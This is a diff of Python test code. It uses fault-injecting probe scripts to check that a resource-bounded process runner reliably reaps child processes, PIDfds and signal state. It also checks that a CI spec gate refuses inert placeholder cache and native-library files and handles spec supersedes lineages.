+handler=signal.getsignal(signal.SIGALRM);mask=signal.pthread_sigmask(signal.SIG_BLOCK,set())
+native=ctypes.CDLL(None,use_errno=True);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0
+native.prctl(36,1,0,0,0)
+real_popen=m.subprocess.Popen;real_table=m.process_table;real_pidfd=m.os.pidfd_open;real_cdll=m.ctypes.CDLL;real_cleanup=m.OwnedFamily.terminate_and_reap;real_rss=m.rss
+calls=0
+
+def table():
+ global calls
+ calls+=1
+ if mode=='read-after' and calls<3:return real_table()
+ hits['table_fault']+=1
+ raise OSError('actual process-table read boundary unavailable')
+def popen(*a,**kw):
+ p=real_popen(*a,**kw);children.append(p);hits['popen']+=1
+ if mode in ('read-before','read-after'):m.process_table=table
+ if mode=='spawn-delay':hits['spawn_delay']+=1;time.sleep(.3)
+ return p
+def pidfd(*a,**kw):
+ hits['pidfd']+=1
+ if mode=='pidfd-failure':hits['pidfd_failure']+=1;raise OSError('actual descriptor acquisition boundary unavailable')
+ fd=real_pidfd(*a,**kw);opened.append(fd)
+ if mode=='pidfd-delay':hits['pidfd_delay']+=1;time.sleep(.3)
+ return fd
+def cleanup(*a,**kw):
+ if mode=='cleanup-delay':hits['cleanup_delay']+=1;time.sleep(.3)
+ return real_cleanup(*a,**kw)
+def rss(pid):
+ if mode in ('cleanup-delay','cleanup-control') and pid!=os.getpid():hits['rss_fault']+=1;raise OSError('actual child RSS read boundary unavailable')
+ return real_rss(pid)
+class NoPriorState:
+ def prctl(self,operation,*a):
+  if operation==37:hits['prior_get_failure']+=1;return -1
+  return native.prctl(operation,*a)
+m.subprocess.Popen=popen;m.os.pidfd_open=pidfd;m.OwnedFamily.terminate_and_reap=cleanup;m.rss=rss
+if mode=='prior-state-failure':m.ctypes.CDLL=lambda *a,**kw:NoPriorState()
+try:
+ try:
+  limit=1 if mode in ('accepted','cleanup-control') else .15
+  with m.deadline_guard(time.monotonic()+limit):
+   report=m.run_bounded([sys.executable,'-c','import signal,time;assert signal.SIGALRM not in signal.pthread_sigmask(signal.SIG_BLOCK,set());time.sleep(.02)' if mode=='accepted' else 'import time;time.sleep(20)'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=limit)
+ except m.DeliveryDeadline as e:outer=str(e)
+ finally:
+  m.subprocess.Popen=real_popen;m.process_table=real_table;m.os.pidfd_open=real_pidfd;m.ctypes.CDLL=real_cdll;m.OwnedFamily.terminate_and_reap=real_cleanup;m.rss=real_rss
+ alive=[p.pid for p in children if p.poll() is None]
+ leaked=[]
+ for fd in opened:
+  try:os.fstat(fd);leaked.append(fd)
+  except OSError:pass
+ state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0
+ result=dict(report=report,outer_deadline=outer,native_children_alive_after_monitor=alive,pidfds_live_after_monitor=leaked,subreaper_after=state.value,mask_restored=signal.pthread_sigmask(signal.SIG_BLOCK,set())==mask,handler_restored=signal.getsignal(signal.SIGALRM)==handler,timer=signal.getitimer(signal.ITIMER_REAL),fault_boundary_hits=hits,native_children_created=len(children),native_pidfds_opened=len(opened))
+finally:
+ for p in children:
+  if p.poll() is None:p.kill()
+  p.wait()
+ for fd in opened:
+  try:os.close(fd)
+  except OSError:pass
+ native.prctl(36,prior.value,0,0,0)
+result['all_fixture_children_reaped']=all(p.returncode is not None for p in children)
+print(json.dumps(result))
+'''
+
+
+def test_measure_inventory_render_acquires_and_unwinds_actual_kernel_resources(tmp_path):
+    """Native read/acquisition/cleanup alarms preserve process, PIDfd, caller-mask and prior-state ownership."""
+    modes=('accepted','read-before','read-after','cleanup-control','spawn-delay','pidfd-delay','pidfd-failure','cleanup-delay','prior-state-failure')
+    results={}
+    for mode in modes:
+        r=subprocess.run([sys.executable,'-c',LIFECYCLE_PROBE,str(REPO/MEASURE),mode],cwd=tmp_path,
+                         capture_output=True,text=True,timeout=5)
+        assert r.returncode==0, (mode,r.stdout,r.stderr)
+        results[mode]=json.loads(r.stdout)
+    (tmp_path/'lifecycle-results.json').write_text(json.dumps(results,indent=2))
+    assert results['accepted']['report']['ok'], results['accepted']
+    assert all(not x['native_children_alive_after_monitor'] and not x['pidfds_live_after_monitor'] for x in results.values()), results
+    assert all(x['subreaper_after']==1 and x['mask_restored'] and x['handler_restored'] and x['timer']==[0,0] for x in results.values()), results
+    assert all(x['all_fixture_children_reaped'] for x in results.values())
+    assert all(not x['report'] or not x['report']['ok'] for name,x in results.items() if name!='accepted'), results
+    boundaries={'read-before':'table_fault','read-after':'table_fault','cleanup-control':'rss_fault',
+                'spawn-delay':'spawn_delay','pidfd-delay':'pidfd_delay','pidfd-failure':'pidfd_failure',
+                'cleanup-delay':'cleanup_delay','prior-state-failure':'prior_get_failure'}
+    assert all(results[name]['fault_boundary_hits'][boundary]>0 for name,boundary in boundaries.items()),results
+    assert all(x['native_children_created']==1 for name,x in results.items() if name!='prior-state-failure'),results
+    assert results['prior-state-failure']['native_children_created']==0,results
+    assert all(x['native_pidfds_opened']>0 for name,x in results.items() if name not in ('prior-state-failure','pidfd-failure')),results
+
+
+RECOVERY_PROBE = r"""
+import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
+s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
+mode=sys.argv[2];pidfile=pathlib.Path('recovery-pids.json');native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,1,0,0,0)==0
+real_popen=m.subprocess.Popen;real_table=m.process_table;real_scandir=m.os.scandir;real_read=pathlib.Path.read_bytes;root=None;targets=[]
+code='''import os,sys,time,json
+if os.fork()==0:
+ os.setsid()
+ child=os.getpid()
+ grand=os.fork()
+ if grand==0:
+  time.sleep(20)
+  os._exit(0)
+ open(sys.argv[1],'w').write(json.dumps([child,grand]))
+ time.sleep(20)
+ os._exit(0)
+time.sleep(20)
+'''
+def lost():raise OSError('general full-table observation unavailable after native fork')
+def scan(*a,**kw):raise OSError('independent raw directory observation also unavailable')
+def read(path,*a,**kw):
+ if str(path)==f'/proc/{os.getppid()}/stat':
+  if mode=='unrelated-malformed':return b'malformed stable process identity'
+  raise OSError('unrelated stable entry inaccessible')
+ return real_read(path,*a,**kw)
+def popen(*a,**kw):
+ global root,targets
+ root=real_popen(*a,**kw)
+ if mode!='accepted':
+  for _ in range(1500):
+   if pidfile.exists():
+    try:targets=json.loads(pidfile.read_text());break
+    except ValueError:pass
+   time.sleep(.001)
+  assert len(targets)==2
+  m.process_table=lost
+  if mode=='both-unavailable':m.os.scandir=scan
+  if mode in ('unrelated-unreadable','unrelated-malformed'):pathlib.Path.read_bytes=read
+ return root
+m.subprocess.Popen=popen
+try:
+ report=m.run_bounded([sys.executable,'-I','-B','-c','import time;time.sleep(.02)' if mode=='accepted' else code,str(pidfile)],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1)
+ result=dict(report=report,root_reaped=root.poll() is not None,descendants_alive=[pid for pid in targets if pathlib.Path('/proc',str(pid)).exists()])
+finally:
+ m.subprocess.Popen=real_popen;m.process_table=real_table;m.os.scandir=real_scandir;pathlib.Path.read_bytes=real_read
+ if root is not None:
+  if root.poll() is None:root.kill()
+  root.wait()
+ for pid in targets:
+  try:os.kill(pid,signal.SIGKILL)
+  except ProcessLookupError:pass
+ for _ in range(1000):
+  for pid in targets:
+   try:os.waitpid(pid,os.WNOHANG)
+   except ChildProcessError:pass
+  if not any(pathlib.Path('/proc',str(pid)).exists() for pid in targets):break
+  time.sleep(.001)
+ native.prctl(36,prior.value,0,0,0)
+result['fixture_cleanup_complete']=not any(pathlib.Path('/proc',str(pid)).exists() for pid in targets)
+print(json.dumps(result))
+"""
+
+
+def test_measure_inventory_render_recovers_unseen_owned_descendants(tmp_path):
+    """Native fork/setsid/grandchild precedes collector loss; independent relationship cleanup owns it safely."""
+    results={}
+    for mode in ('accepted','collector-unavailable','unrelated-unreadable','unrelated-malformed','both-unavailable'):
+        directory=tmp_path/mode;directory.mkdir()
+        r=subprocess.run([sys.executable,'-c',RECOVERY_PROBE,str(REPO/MEASURE),mode],cwd=directory,
+                         capture_output=True,text=True,timeout=5)
+        assert r.returncode==0,(mode,r.stdout,r.stderr)
+        results[mode]=json.loads(r.stdout)
+    (tmp_path/'recovery-results.json').write_text(json.dumps(results,indent=2))
+    assert results['accepted']['report']['ok'] and results['accepted']['report']['owned_family_gone'],results
+    assert all(x['root_reaped'] and x['fixture_cleanup_complete'] for x in results.values()),results
+    for mode in ('collector-unavailable','unrelated-unreadable','unrelated-malformed'):
+        assert not results[mode]['report']['ok'] and not results[mode]['descendants_alive'],results
+    assert results['collector-unavailable']['report']['owned_family_gone'],results
+    # Unreadable stable entries leave uncertainty, even when every actually owned process was stopped.
+    assert not results['unrelated-unreadable']['report']['owned_family_gone'],results
+    assert not results['unrelated-malformed']['report']['owned_family_gone'],results
+    # Both real observation paths can be unavailable; known root cleanup still runs, with no false family claim.
+    assert not results['both-unavailable']['report']['ok'] and not results['both-unavailable']['report']['owned_family_gone'],results
+
+
+NATIVE_NAME_PROBE = r'''
+import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
+s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
+mode=sys.argv[2];native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,1,0,0,0)==0
+oldname=ctypes.create_string_buffer(16);assert native.prctl(16,oldname,0,0,0)==0
+real_popen=m.subprocess.Popen;real_sample=m.OwnedFamily.sample;real_identity=m.process_identity;root=None;hits=dict(native_name=False,sample_barrier=0,parser_failure=0);ready=pathlib.Path('native-name.ready');go=pathlib.Path('native-name.go')
+code="import ctypes,pathlib,sys,time;"+("\nwhile not pathlib.Path(sys.argv[2]).exists():time.sleep(.001)\n" if mode=='after-admission' else '')+"assert ctypes.CDLL(None).prctl(15,ctypes.c_char_p(b'bad-\\xff'),0,0,0)==0;pathlib.Path(sys.argv[1]).write_text('ready');time.sleep(.05)"
+def wait_name():
+ for _ in range(1000):
+  if ready.exists():break
+  time.sleep(.001)
+ assert ready.exists()
+ hits['native_name']=b'bad-\xff' in pathlib.Path('/proc',str(root.pid),'stat').read_bytes()
+ assert hits['native_name']
+def identity(pid):
+ if root is not None and pid==root.pid:hits['parser_failure']+=1;raise ValueError('ordinary identity parser boundary failure')
+ return real_identity(pid)
+def popen(*a,**kw):
+ global root
+ root=real_popen(*a,**kw)
+ if mode=='before-admission':wait_name()
+ if mode=='parser-failure':m.process_identity=identity
+ return root
+def sample(family):
+ if mode=='after-admission' and root is not None and not hits['sample_barrier']:
+  assert family.snapshot().get(root.pid) is not None
+  hits['sample_barrier']+=1;go.write_text('go');wait_name()
+ return real_sample(family)
+m.subprocess.Popen=popen;m.OwnedFamily.sample=sample
+if mode=='unrelated-native-name':
+ assert native.prctl(15,ctypes.c_char_p(b'bad-\xff'),0,0,0)==0
+ hits['native_name']=b'bad-\xff' in pathlib.Path('/proc/self/stat').read_bytes()
+try:
+ try:
+  report=m.run_bounded([sys.executable,'-I','-B','-c',code if mode in ('before-admission','after-admission') else 'import time;time.sleep(20)' if mode=='parser-failure' else 'pass',str(ready),str(go)],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1)
+  result=dict(report=report,escaped_exception=None)
+ except Exception as e:result=dict(report=None,escaped_exception=type(e).__name__+': '+str(e))
+ result.update(root_created=root is not None,root_alive_after_monitor=root is not None and root.poll() is None,hits=hits)
+ state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0;result['subreaper_restored']=state.value==1
+finally:
+ m.subprocess.Popen=real_popen;m.OwnedFamily.sample=real_sample;m.process_identity=real_identity
+ if root is not None:
+  if root.poll() is None:root.kill()
+  root.wait()
+ native.prctl(15,oldname,0,0,0);native.prctl(36,prior.value,0,0,0)
+result['fixture_reaped']=root is None or root.returncode is not None
+print(json.dumps(result))
+'''
+
+
+def test_measure_inventory_render_reads_native_process_names_as_bytes(tmp_path):
+    """Real PR_SET_NAME 0xff before root admission/after sampling and outside the family needs no decoding."""
+    results={}
+    for mode in ('ascii','before-admission','after-admission','unrelated-native-name','parser-failure'):
+        directory=tmp_path/mode;directory.mkdir()
+        r=subprocess.run([sys.executable,'-c',NATIVE_NAME_PROBE,str(REPO/MEASURE),mode],cwd=directory,
+                         capture_output=True,text=True,timeout=5)
+        assert r.returncode==0,(mode,r.stdout,r.stderr)
+        results[mode]=json.loads(r.stdout)
+    (tmp_path/'native-name-results.json').write_text(json.dumps(results,indent=2))
+    assert all(x['escaped_exception'] is None and not x['root_alive_after_monitor'] and x['subreaper_restored'] and x['fixture_reaped'] for x in results.values()),results
+    for mode in ('ascii','before-admission','after-admission','unrelated-native-name'):
+        assert results[mode]['root_created'] and results[mode]['report']['ok'] and results[mode]['report']['owned_family_gone'],results
+    assert all(results[mode]['hits']['native_name'] for mode in ('before-admission','after-admission','unrelated-native-name')),results
+    assert results['after-admission']['hits']['sample_barrier']==1,results
+    assert results['parser-failure']['root_created'] and results['parser-failure']['hits']['parser_failure']>0 and not results['parser-failure']['report']['ok'],results
+
+
+def base_checkout_input_pr(repo: Path, branch: str, files: dict[str, str], **meta):
+    """Read candidate inert slots only as Git data, matching the public BASE-checkout gate job."""
+    change(repo,branch,files)
+    base,head=base_and_head(repo)
+    _git(repo,'checkout','-q','-f','main')
+    return gate(repo,'--pr',base,head,PR_HEAD_REF=branch,**meta)
+
+
+def test_effective_python_input_slots_have_inert_native_admission_controls(repo):
+    """Inert bytes prove startup-slot ownership without executing candidate cache/native artifacts."""
+    ci_branch='fix/feat-cicd-001-startup-slots';ci_spec='docs/superpowers/specs/2026-09-01-startup-slots.md';ci_plan='docs/superpowers/plans/2026-09-01-startup-slots.md'
+    row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
+    sources={'scripts/maintenance/doc_inventory.py','scripts/maintenance/check_generated_docs.py','scripts/maintenance/__init__.py','scripts/maintenance/doc_source_snapshot.py','tests/scripts/measure_inventory_render.py'}
+    on_base(repo,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch),**{p:'# Trusted source-presence fixture; not executed.\n' for p in sources}})
+    tag=sys.implementation.cache_tag;inert='Inert admission fixture: not executable bytecode or a native library.\n'
+    slots=(f'scripts/maintenance/__pycache__/doc_inventory.{tag}.pyc',f'scripts/maintenance/__pycache__/__init__.{tag}.opt-1.pyc','scripts/maintenance/check_generated_docs.abi3.so','scripts/maintenance/doc_inventory.pyc',f'tests/scripts/__pycache__/measure_inventory_render.{tag}.pyc')
+    control=base_checkout_input_pr(repo,BRANCH,{**CODE,'scripts/maintenance/cache-notes.bin':inert},**DOCS_OK)
+    results={p:base_checkout_input_pr(repo,BRANCH,{**CODE,p:inert},**DOCS_OK) for p in slots}
+    assert control.returncode==0,control.stdout+control.stderr
+    assert all(r.returncode==1 and 'belong to FEAT-CICD-001' in r.stdout for r in results.values()),{p:r.stdout for p,r in results.items()}
+    owner=base_checkout_input_pr(repo,ci_branch,{**CODE,slots[0]:inert},PR_TITLE='FEAT-CICD-001: input ownership',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan))
+    assert owner.returncode==0,owner.stdout+owner.stderr
+    # Tagged cache without its source cannot initialize this namespace package.
+    orphan=base_checkout_input_pr(repo,BRANCH,{**CODE,f'scripts/__pycache__/__init__.{tag}.pyc':inert},**DOCS_OK)
+    assert orphan.returncode==0,orphan.stdout+orphan.stderr
+    sg=load_gate(repo)
+    effective_sources=sources|{'scripts/__init__.py','scripts/gate/spec_gate.py','json.py',
+                              'scripts/maintenance/docs_audit.py','tests/scripts/test_doc_source_snapshot.py',
+                              'tests/scripts/test_docs_audit.py','tests/scripts/test_spec_gate.py'}
+    present=types.SimpleNamespace(mode=lambda path:'100644' if path in effective_sources else None)
+    for source in effective_sources:
+        for optimization in ('','1','2'):
+            cache=importlib.util.cache_from_source(source,optimization=optimization)
+            assert sg.is_process_file(cache,(present,present)),cache
+        assert sg.is_process_file(source[:-3]+'.abi3.so',(present,present)),source
+    assert sg.is_process_file(f'tests/scripts/__pycache__/test_spec_gate.{tag}-pytest-8.3.2.pyc',(present,present))
+    assert sg.source_import_shadow(importlib.util.cache_from_source('json.py'),present={'json.py'})
+    assert not sg.source_import_shadow(importlib.util.cache_from_source('json.py'),present=set())
+
+
+def test_effective_renderer_slots_refuse_beside_generated_docs_for_the_owner(inventory_repo):
+    """The CICD owner still cannot change effective renderer/init slots alongside generated output."""
+    if RENDERER_HERE:
+        root,_=inventory_repo;ci_branch='fix/feat-cicd-001-render-inputs';ci_spec='docs/superpowers/specs/2026-09-01-render-inputs.md';ci_plan='docs/superpowers/plans/2026-09-01-render-inputs.md'
+        row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
+        on_base(root,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch),'scripts/__init__.py':'# Trusted empty initializer.\n'},then=render)
+        change(root,ci_branch,{MAIN_PY:moved_main()},then=render)
+        expected={p:(root/p).read_text() for p in (MAIN_PY,*GENERATED)}
+        meta=dict(PR_TITLE='FEAT-CICD-001: renderer inputs',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan)+'\n\n## Capacity\nn/a: native fixture only\n')
+        tag=sys.implementation.cache_tag;inert='Inert admission fixture; never imported.\n'
+        control=base_checkout_input_pr(root,ci_branch,{**expected,'scripts/maintenance/cache-notes.bin':inert},**meta)
+        slots=(f'scripts/maintenance/__pycache__/doc_inventory.{tag}.pyc',f'scripts/maintenance/__pycache__/check_generated_docs.{tag}.opt-2.pyc',f'scripts/maintenance/__pycache__/__init__.{tag}.opt-1.pyc',f'scripts/__pycache__/__init__.{tag}.pyc','scripts/maintenance/check_generated_docs.abi3.so','scripts/maintenance/doc_inventory.pyc')
+        results={p:base_checkout_input_pr(root,ci_branch,{**expected,p:inert},**meta) for p in slots}
+        assert control.returncode==0,control.stdout+control.stderr
+        assert all(refused(r,'which decide the render') for r in results.values()),{p:r.stdout+r.stderr for p,r in results.items()}
+
+
+def test_effective_slots_include_current_policy_base_source_presence(inventory_repo):
+    """Inert cache fork predates trusted BASE's initializer: actual current BASE, HEAD and fork all matter."""
+    if RENDERER_HERE:
+        root,moved=inventory_repo;ci_branch='fix/feat-cicd-001-current-inputs';ci_spec='docs/superpowers/specs/2026-09-01-current-inputs.md';ci_plan='docs/superpowers/plans/2026-09-01-current-inputs.md'
+        row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
+        on_base(root,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch)})
+        fork=_git(root,'rev-parse','base');slot=importlib.util.cache_from_source('scripts/__init__.py');inert='Inert source-presence admission fixture; not executable.\n'
+        change(root,BRANCH,{**CODE,slot:inert});unrelated=_git(root,'rev-parse','HEAD')
+        change(root,ci_branch,{**moved,slot:inert});owner=_git(root,'rev-parse','HEAD')
+        change(root,ci_branch,{**moved,'scripts/cache-notes.bin':inert});control=_git(root,'rev-parse','HEAD')
+        _git(root,'checkout','-q','-f','main')
+        orphan=gate(root,'--pr',fork,unrelated,PR_HEAD_REF=BRANCH,**DOCS_OK)
+        assert orphan.returncode==0,orphan.stdout+orphan.stderr
+        on_base(root,{'scripts/__init__.py':'# Newly present trusted initializer.\n'})
+        current=_git(root,'rev-parse','base');assert _git(root,'merge-base',current,owner)==fork
+        refused_owner=gate(root,'--pr',current,unrelated,PR_HEAD_REF=BRANCH,**DOCS_OK)
+        meta=dict(PR_HEAD_REF=ci_branch,PR_TITLE='FEAT-CICD-001: current renderer inputs',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan)+'\n\n## Capacity\nn/a: inert native fixture\n')
+        refused_render=gate(root,'--pr',current,owner,**meta)
+        accepted=gate(root,'--pr',current,control,**meta)
+        assert refused_owner.returncode==1 and 'belong to FEAT-CICD-001' in refused_owner.stdout,refused_owner.stdout
+        assert refused(refused_render,'which decide the render'),refused_render.stdout+refused_render.stderr
+        assert accepted.returncode==0,accepted.stdout+accepted.stderr
+
+
+FORMAL_OBSERVER_PROBE = r'''
+import ctypes,importlib.util,json,os,pathlib,subprocess,sys,threading,time
+s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
+mode=sys.argv[2];native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,0,0,0,0)==0
+real_popen=m.subprocess.Popen;real_discover=m.OwnedFamily.discover;real_pidfd=m.os.pidfd_open;real_close=m.os.close;real_snapshot=m.OwnedFamily.snapshot;real_cleanup=m.OwnedFamily.terminate_and_reap;real_run=m.run_bounded
+children=[];opened=[];hits=dict(late_error=0,close_error=0,snapshot_error=0);closed=[];release=threading.Event();failed=threading.Event();final_phase=False
+
+def popen(*a,**kw):
+ p=real_popen(*a,**kw);children.append(p)
+ if mode=='late-error':
+  poll=p.poll
+  def delayed_poll():
+   if not release.is_set():
+    p.wait(timeout=1);release.set();assert failed.wait(1)
+   return poll()
+  p.poll=delayed_poll
+ return p
+def discover(family,**kw):
+ if mode=='late-error' and threading.current_thread() is not threading.main_thread():
+  assert release.wait(1);hits['late_error']+=1;failed.set();raise OSError('late actual collector boundary failure')
+ return real_discover(family,**kw)
+def pidfd(*a,**kw):
+ fd=real_pidfd(*a,**kw);opened.append(fd);return fd
+def close(fd):
+ if final_phase=='ready' and fd in opened:closed.append(fd)
+ if mode in ('close-error','persistent-close') and final_phase=='ready' and fd in opened and (mode=='persistent-close' or not hits['close_error']):
+  hits['close_error']+=1;raise OSError('actual stopped PIDfd close boundary unavailable once')
+ return real_close(fd)
+def cleanup(*a,**kw):
+ global final_phase
+ result=real_cleanup(*a,**kw)
+ if final_phase:final_phase='ready'
+ else:final_phase=True
+ return result
+def snapshot(family):
+ if mode=='snapshot-error' and final_phase=='ready' and not hits['snapshot_error']:
+  hits['snapshot_error']+=1;raise OSError('final ownership snapshot boundary unavailable once')
+ return real_snapshot(family)
+m.subprocess.Popen=popen;m.OwnedFamily.discover=discover;m.os.pidfd_open=pidfd;m.os.close=close;m.OwnedFamily.terminate_and_reap=cleanup;m.OwnedFamily.snapshot=snapshot
+result={}
+try:
+ try:
+  if mode=='main':
+   codes=[];paths=[];times=[]
+   time.sleep(.35)
+   for index in range(2):
+    path=pathlib.Path(f'public-{index}.json');started=time.monotonic();codes.append(m.main(['--max-seconds','.3','--max-rss-mib','1','--output',str(path)]));times.append(time.monotonic()-started);paths.append(json.loads(path.read_text()) if path.exists() else None)
+   result.update(codes=codes,public_reports=paths,invocation_seconds=times)
+  else:
+   if mode=='accepted':
+    result['prior_high_report']=m.run_bounded([sys.executable,'-c','import time;x=bytearray(96*1024*1024);time.sleep(.02)'],pathlib.Path.cwd(),max_rss_bytes=256*1024*1024,max_seconds=2)
+   report=m.run_bounded([sys.executable,'-c','import time;time.sleep(.02)'],pathlib.Path.cwd(),max_rss_bytes=(64 if mode=='accepted' else 128)*1024*1024,max_seconds=1)
+   result['report']=report
+   if mode=='persistent-close':
+    before=len(children);result['second_report']=m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1);result['no_second_spawn']=len(children)==before;result['retained_reachable']=m.RETAINED_OWNERSHIP is not None
+  result['escaped_exception']=None
+ except Exception as e:result['escaped_exception']=type(e).__name__+': '+str(e)
+ state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0
+ leaked=[]
+ for fd in opened:
+  try:os.fstat(fd);leaked.append(fd)
+  except OSError:pass
+ result.update(hits=hits,children_created=len(children),native_children_alive=[p.pid for p in children if p.poll() is None],opened_pidfds=len(opened),live_pidfds=leaked,subreaper_after=state.value,owned_fd_close_attempts=closed)
+finally:
+ m.subprocess.Popen=real_popen;m.OwnedFamily.discover=real_discover;m.os.pidfd_open=real_pidfd;m.os.close=real_close;m.OwnedFamily.snapshot=real_snapshot;m.OwnedFamily.terminate_and_reap=real_cleanup;m.run_bounded=real_run
+ for p in children:
+  if p.poll() is None:p.kill()
+  p.wait()
+ for fd in opened:
+  try:real_close(fd)
+  except OSError:pass
+ native.prctl(36,prior.value,0,0,0)
+print('FORMAL_RESULT='+json.dumps(result))
+'''
+
+
+def test_measure_inventory_render_preserves_formal_review_terminal_invariants(tmp_path):
+    """Actual collector/close/snapshot boundaries and repeated imported public calls cannot report false success."""
+    results={}
+    for mode in ('accepted','late-error','close-error','snapshot-error','main'):
+        path=tmp_path/mode;path.mkdir()
+        r=subprocess.run([sys.executable,'-c',FORMAL_OBSERVER_PROBE,str(REPO/MEASURE),mode],cwd=path,
+                         capture_output=True,text=True,timeout=5)
+        assert r.returncode==0,(mode,r.stdout,r.stderr)
+        results[mode]=json.loads(next(line[len('FORMAL_RESULT='):] for line in r.stdout.splitlines() if line.startswith('FORMAL_RESULT=')))
+    (tmp_path/'formal-terminal-results.json').write_text(json.dumps(results,indent=2))
+    assert all(x['escaped_exception'] is None and not x['native_children_alive'] and not x['live_pidfds'] and x['subreaper_after']==0 for x in results.values()),results
+    assert all(x['children_created']>0 and x['opened_pidfds']>0 for name,x in results.items() if name!='main'),results
+    assert results['accepted']['report']['ok'] and results['accepted']['prior_high_report']['ok'],results
+    low=results['accepted']['report']
+    assert low['peak_rss_bytes']<64*1024*1024<low['kernel_child_peak_bytes'] and low['kernel_child_peak_before_bytes']>=64*1024*1024 and low['kernel_child_peak_scope']=='process-lifetime cumulative; diagnostic only',results
+    for mode,key in (('late-error','late_error'),('close-error','close_error'),('snapshot-error','snapshot_error')):
+        assert results[mode]['hits'][key]==1 and not results[mode]['report']['ok'],results
+    assert results['main']['codes']==[1,1] and all(x and not x['ok'] and x['reason']=='rss_limit' and 0<x['elapsed_before_emission_seconds']<.3 for x in results['main']['public_reports']),results
+
+
+# ---------------------------------------------------------------------------------------------
+# FEAT-CICD-001 spec 2026-10-31-feat-cicd-001-supersedes-chain-retirement: the status-only
+# retirement of a spec that itself superseded one, and validation of the whole supersedes lineage.
+# Fixture lineage (spec, "Acceptance fixtures"): Q = SPEC (superseded), P names Q, N names P.
+# ---------------------------------------------------------------------------------------------
+
+P_SPEC = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
+N_SPEC = "docs/superpowers/specs/2026-09-03-model-decisions-v3.md"
+R_SPEC = "docs/superpowers/specs/2026-08-30-model-decisions-v0.md"
+D_SPEC = "docs/superpowers/specs/2026-09-04-model-decisions-draft.md"
+ROUND_EIGHT = "which is already superseded; name the spec that replaced it (round eight)"
+REDUNDANT = "already superseded on the current base; merge main, resolve any remaining differences, and rerun the gate"
+RETIRE_BRANCH = "docs/spec-feat-model-001-v3"
+
+
+def retirement_lineage(repo: Path, **extra: str | None) -> None:
+    """Q (SPEC) superseded with a null pointer; P approved, naming Q; plus `extra` files, on the base."""
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=SPEC), **extra})
+
+
+def flipped_p(**over) -> str:
+    """P with only its status line changed, as the retirement edit writes it."""
+    return spec(status="superseded", supersedes=SPEC, **over)
+
+
+def divergent_pr(repo: Path, branch: str, branch_files: dict[str, str | None], main_files: dict[str, str | None],
+                 **env: str) -> subprocess.CompletedProcess:
+    """A branch cut from `base` whose head keeps the old merge base while main advances (the shape of
+    test_policy_documents_are_read_at_the_current_base): policy is read at the advanced tip."""
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "clean", "-qfd")
+    _git(repo, "checkout", "-q", "-B", branch, "base")
+    for path, text in branch_files.items():
+        if text is None:
+            (repo / path).unlink()
+        else:
+            write(repo, path, text)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", f"change on {branch}")
+    head = _git(repo, "rev-parse", "HEAD")
+    on_base(repo, main_files)
+    return gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, **{"PR_HEAD_REF": branch, **env})
+
+
+def test_depth_two_retirement_pr_mode_admits_status_only_flip_with_approved_replacement(repo):
+    """Spec done_when[0], A1 and C4. The #1649 shape: N added and P flipped status-only in one PR; main
+    refuses it with the round-eight message although the in-place rule admits exactly this edit."""
+    retirement_lineage(repo)
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
+    # C4: an unrelated approved spec lands on main after the fork; policy is read at the advanced tip and P is still approved there
+    other = "docs/superpowers/specs/2026-09-05-data-other.md"
+    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()},
+                     {other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")})
+    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
+
+
